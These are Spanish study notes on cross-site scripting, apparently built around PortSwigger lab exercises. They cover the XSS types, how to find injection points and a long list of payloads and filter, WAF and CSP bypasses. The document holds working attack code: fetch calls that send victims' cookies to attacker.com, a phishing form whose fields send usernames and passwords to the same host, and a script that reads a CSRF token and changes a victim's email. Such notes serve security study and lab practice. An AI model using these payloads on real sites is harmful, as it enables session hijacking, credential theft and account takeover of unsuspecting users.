
---------
[CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

----------
# Definición

>**Cross-Site Scripting (XSS)** es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante **inyectar scripts** maliciosos (normalmente en **JavaScript**) en páginas vistas por otros usuarios. Estos scripts se ejecutan en el navegador de la víctima como si fueran parte del sitio legítimo, lo que puede llevar a **robo de cookies**, **suplantación** de identidad, **redirecciones** no autorizadas o **ejecución** de acciones sin consentimiento.

[ChatGPT](https://chatgpt.com)

Existen tres tipos principales de XSS:

1. **Reflejado (Reflected XSS):** el script malicioso se envía como parte de una solicitud (como una URL) y se refleja directamente en la respuesta del servidor.
    
2. **Almacenado (Stored XSS):** el script se guarda en el servidor (por ejemplo, en una base de datos) y se ejecuta cuando otro usuario accede a esa información.
    
3. **DOM-based XSS:** ocurre en el lado del cliente, cuando el script malicioso se ejecuta por una manipulación del DOM sin intervención del servidor.

----------

# Identificación

1. Se busca un **parámetro** controlado por el **input** del usuario que se refleje en el **html** de la web.
2. Se prueba inyectar un ```alert()``` entre etiquetas ```<script>``` **escapando** del contexto del input en el html para que se ejecute el comando.

	(Esto solo aplica para casos sencillos. Cuando se complica la cosa resulta bastante difícil identificar el vector)
----------

# Formas de explotación

## Básico
- Cargar una **imagen** como `<img src=0 onerror=alert()>`.
- Si el parámetro se inserta en un **href**, se puede introducir `javascript:alert()`.
- Desde una página atacante, se puede cargar una página vulnerable dentro de esta mediante el elemento **iframe**: `<iframe src="http://dominio-vulnerable.com/"</iframe>`.
	También se puede redirigir a la página vulnerable con `location` dentro de etiquetas `<script>`.

## <> html-encoded
- En un contexto donde los caracteres **<>** están siendo **html-encoded**, si el input se introduce dentro de un atributo, se puede escapar de él e insertar otros.
	Por ejemplo, si tenemos:
	``` html
	<input type=text placeholder='Search the blog...' name=search value="">
	```
	donde *value* es el parámetro que controlamos, podemos introducir:
	``` payload
	" autofocus onfocus="alert()
	```
	Si no hace focus, habría que indicarle como parámetro `tabindex=1`.
	Otra variante al autofocus sería añadir un **id** y luego en la URL referenciar el id mediante un **#**.

## AngularJS
- Si se encuentran atributos **ng-app**, está corriendo la librería **AngularJS**. Se puede explotar inyectando código encapsulado entre **{{}}**. Se puede utilizar un payload como:
	``` AngularJS
	{{constructor.constructor('alert()')()}}
	```
	Nota: Puede que el payload no funcione. En ese caso, probar con otros de esta página:
	[AngularJS_Payloads](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/5%20-%20XSS%20in%20Angular/#summary)

## eval()
- La función **eval()** de javascript es potencialmente peligrosa y si el input del usuario se vuelca en esta sentencia, se puede aprovechar para realizar un XSS. Es necesario escapar del contexto del objeto que ya se estaba introduciendo. Se puede realizar mediante **;** o por operatorias aritméticas como **+, -, \***, etc.

## html-replace()
- La función **html.replace()** solo reemplaza el primer match, por lo que si se utiliza para reemplazar **<>**, simplemente se introducen al inicio y posteriormente el payload.

## Web Application Firewall (WAF)
- Si existe un **WAF** que bloquea **<[a-zA-Z]**, se puede intentar bypassear la restricción introduciendo la etiqueta html como `<%tag`. (No fiable)
	La mejor forma es **iterar** por todas las **etiquetas** hasta encontrar una que funcione o utilizar **\<custom tags>**. Lo mismo aplica para los **atributos**.

## Etiquetas bloqueadas
 - Si todas las etiquetas están **bloqueadas** menos `<svg>`, se pueden probar las etiquetas de animación sobre objetos svg como: `<animate>`, `<animateMotion>`, `<animateTransform>` y `<set>`.

## Atributos bloqueados
- Si todos los **atributos** están **bloqueados** pero la etiqueta `<svg>` junto con un animate están permitidas, se pueden realizar cambios en los atributos del objeto.
	Ejemplo con etiqueta `<a>` y campo href:
	``` html
	<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x="20" y="20">Click here!</text></a></svg>
	```
	
## href
 - Si se controla el href de un **link canónico**, se puede intentar escapar del contexto introduciendo un **?** junto con una **comilla** al final de la URL seguido de los atributos que carguen el payload.

## Símbolos html-encoded
 - Si todos los **símbolos** que permiten la escapada del contexto están siendo **escapados**, se puede intentar introducir los símbolos **html-encoded**. Ejemplo:
	 ``` html
	 "handler' payload"      --> "handler\' payload"
	 "handler&apos; payload" --> "handler' payload"
	```

## Template literal
- Si el parámetro que se controla se introduce en un **template literal** (identificado por **backticks \`\`**), se puede introducir una expresión **${}** que será evaluada.
	``` javascript
	var vuln = `Aquí va tu texto: '${payload}'`;
	```

## Paréntesis deshabilitados
- Si el XSS requiere **paréntesis** pero no están habilitados, se puede crear una **lambda function** con parámetro x (nombre de la función u otra cosa) que lance una **excepción** manejada con **onerror** para que lance un alert. Para llamar a esta función se sobrescribe el método **toString** que se llama implícitamente al concatenar un string con una variable de otro tipo (como **window**, variable global), y forzar esta llamada.
	``` javascript
	x = x => {
		throw onerror=alert,1;
	}

	toString = x;
	window + '';
	```

## Formularios
- Se pueden aprovechar los **formularios** para evadir el CSP. También pueden resultar útiles para encapsular dentro de ellos contenidos sensibles dentro de etiquetas `<input>`:
	``` html
	<form class="login-form" name="jeje" action="https://exploit-0a4a00a403631340801cc0ca014600ad.exploit-server.net/exploit" method="GET">
		<input required="" type="hidden" name="csrf" value="hXr1NFGKjm72imasJziRezrJ3wVAE1N0">
		<button class="button" type="submit">Click here!</button>
	</form>
	```
	Con este código se recibirá una petición por GET al servidor local con parámetro csrf="*CSRF-token de la víctima*".

--------
# Robo de cookies

Una vez encontrada la vulnerabilidad XSS, se puede realizar una petición a un servidor propio concatenando la cookie de la victima.
Ejemplo simplificado:
``` html
<script>
	fetch("http://attacker.com/?cookie=" + document.cookie);
</script>
```
Si document.cookie tiene **caracteres especiales**, para evitar problemas con el URL-encode, se puede codificar a base64:
``` html
<script>
	fetch("http://attacker.com/?cookie=" + btoa(document.cookie));
</script>
```

-----------
# Robo de credenciales

Se puede construir un formulario con campos usuario y contraseña a modo de **phishing**, y enviarte las credenciales a tu máquina atacante.
Ejemplo simplificado:
``` html
Formulario:<br><br>
Usuario: <input name="username" id="username" onchange="fetch('http://attacker.com/?username=' + this.value)"><br><br>
Contraseña: <input name="password" id="password" onchange="fetch('http://attacker.com/?password=' + this.value)">
```

---------
# Realizar acciones como otro usuario (CSRF)

Mediante una vulnerabilidad XSS se pueden programar acciones para que las ejecute otro usuario. Hay medidas de protección como el **CSRF-token** que es único y variable para cada usuario y requerido para cualquier acción. Sin embargo, se puede tratar de conseguir. En el siguiente ejemplo, el CSRF-token está hard-codeado en el código html de la página del usuario:
``` html
<script>
  var req1 = new XMLHttpRequest();
  req1.open("GET", "https://0a840008044577f98093037000b20046.web-security-academy.net/my-account", false);
  req1.send();
  var response1 = req1.responseText;
  var csrf = response1.match('name="csrf" value="(.*?)"')[1];
  var req2 = new XMLHttpRequest();
  req2.open("POST", "https://0a840008044577f98093037000b20046.web-security-academy.net/my-account/change-email", true);
  req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + csrf;
  req2.send(data);
</script>
```
- Un ejemplo de formulario que cambia el email de otro usuario es el siguiente:
	``` html
	<html>
		<body>
			<form action="https://0a8e001e03f713cd8087c11400a60017.web-security-academy.net/my-account/change-email" method="POST">
				<input required="" type="hidden" name="email" value="hacker@evil-user.net" />
				<input required="" type="hidden" name="csrf" value="FAcDkA6gQR227EHMBCymDClSTAVNFZnK" />
				<input type="submit" value="Submit request" />
			</form>

			<script>
				history.pushState('', '', '/');
				document.forms[0].submit();
			</script>
		</body>
	</html>
	```
	-*history.pushState()* cambia la url para ocultar el payload.
	-*document.forms[0].submit()* lanza petición del formulario.

----------
# AngularJS

Los módulos de AngularJS tienen la estructura:
``` javascript
angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse)) {
	$scope.query = {};
	var key = 'search';
	$scope.query[key] = 'testing'; // $scope.query['search'] = 'testing';query -> {search: 'testing'}
	$scope.value = $parse(key)($scope.query); // Línea vulnerable
	// $scope.value = $scope.query[key]; Forma correcta
});

// function search(obj) {
//		return obj['search'];
// }

// $scope -> objeto especial -> controlador/vista
// $parse -> servicio que interpreta expresiones AngularJS. user.name
```
En este caso, el código es vulnerable porque utiliza **$parse** sobre la entrada del usuario.

-----------
# Content Security Policy (CSP)

Se puede identificar en la respuesta HTTP del servidor.
``` http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
```
Para evaluar el CSP en busca de posibles riesgos, se puede hacer mediante la herramienta de google [CSP_Evaluator](https://csp-evaluator.withgoogle.com/).
- En un caso raro y concreto, si en el CSP se muestra la entrada del usuario:
	```
	Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=MiEntrada
	```
	se puede utilizar para settear una política y **bypassear** el CSP:
	``` URL
	http://vulnerable.com/?search=<script>alert()</script>&token=; script-src-elem 'unsafe-inline'
	```

-----------
## Cosas interesantes

- La función **hashchange** de *jQuery* detecta un cambio en el parámetro de la url:
	``` URL
	http://loquesea.com/#PARAMETRO
	```
- La función de jQuery **$()** crea el objeto introducido en él temporalmente.
- Si una función **escapa** ciertos caracteres, se puede introducir una **\\** para escapar el escape, de modo que queda:
	``` json
	{
		"atributo": "handler\\" Me he escapado"
	}
	```
- Se puede definir un shortcut para una etiqueta con accesskey junto con el atributo onclick para lanzar el payload.
	``` html
	<link rel='canonical' href='http://loquesea.com' accesskey='x' onclick='alert()'>
	```

- Se puede ofuscar un atributo de un elemento html alterando entre mayúsculas y minúsculas.
	``` html
	<img src=0 onErROr=alert`1`>
	```
### Javascript

- Si añades más parámetros de los esperados a una llamada de función, la función se ejecutará con los primeros parámetros esperados, pero se evaluarán los parámetros añadidos:
	``` javascript
	function suma(a, b) {
		console.log(a + b);
	}

	suma(1, 2); // Printeará "3"
	suma(1, 2, console.log(5)); // Printeará "5" y luego "3"
	```
	![[funcion_javascript_XSS.png]]
- Se puede jugar con **/\*\*/** para introducir espacios si el espacio no se interpreta correctamente.